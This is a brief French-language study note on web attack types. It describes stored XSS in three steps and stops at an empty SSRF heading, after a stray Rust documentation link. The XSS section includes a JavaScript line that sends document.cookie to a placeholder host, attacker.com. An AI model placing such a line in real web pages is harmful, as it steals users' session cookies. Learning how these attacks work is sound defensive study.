https://doc.rust-lang.org/rust-by-example/index.html
# Différents types d'attaque
### XSS
1. Insérer un bout de code malveillant dans un user input
2. Le bout de code se retrouve dans la BD
3. Si un autre utilisateur fetch ce code JS et qu'il est executé sur le navigateur de la victime, celle-ci peut se faire voler son cookie ou d'autres données sensibles
```
var url = "https://attacker.com/steal-cookie.php?cookie=" + document.cookie;
```

### SSRF